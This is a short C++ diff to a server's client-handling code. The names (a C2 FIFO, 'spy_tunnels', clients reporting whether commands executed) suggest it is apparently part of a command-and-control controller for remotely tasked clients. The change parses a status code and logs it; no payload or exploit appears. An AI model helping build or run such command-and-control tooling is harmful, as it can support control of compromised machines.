@@ -84,9 +84,6 @@ int Server::init() {
         return -1;
     }
 
-    /*for (int i=0; i<max_connections_; i++) {
-        spy_tunnels_[i] = {};
-    }*/
     client_threads_.resize(max_connections_);
     clients_.resize(max_connections_);
     for (int i=0;i<max_connections_;i++) {
@@ -248,8 +245,18 @@ void Server::handle_client(ClientHandler* client) {
             event_log << RED << "[Server::handle_client] Client: " << client->index() << " disconnected" << RESET;
             break;
         } else {
-            if (strncmp(buffer, OUT_KEY, strlen(OUT_KEY)) == 0) {
-                event_log << CYAN << buffer + OUT_KEY_SIZE << RESET_C2_FIFO;
+            if (memcmp(buffer, OUT_KEY, OUT_KEY_LEN) == 0) {
+                Comm status = static_cast<uint16_t>(
+                    static_cast<uint8_t>(buffer[OUT_KEY_LEN]) |
+                    (static_cast<uint8_t>(buffer[OUT_KEY_LEN + 1]) << 8)
+                );
+                if (status == EXEC_SUCCESS) {
+                    event_log << LOG_MINOR_EVENTS << GREEN << "[Server::handle_client] Client " << client->index() << " executed command successfully" << RESET_C2_FIFO;
+                } else if (status == EXEC_ERROR) {
+                    event_log << LOG_MINOR_EVENTS << RED << "[Server::handle_client] Client " << client->index() << " failed to execute command" << RESET_C2_FIFO;
+                } else {
+                    event_log << LOG_MINOR_EVENTS << YELLOW << "[Server::handle_client] Client " << client->index() << " unknown status: " << status << RESET_C2_FIFO;
+                }
             } else {
                 event_log << LOG_MINOR_EVENTS <<  GREEN << "[Server::handle_client] Data from client " << client->index() << ": " << buffer << RESET;                
             }
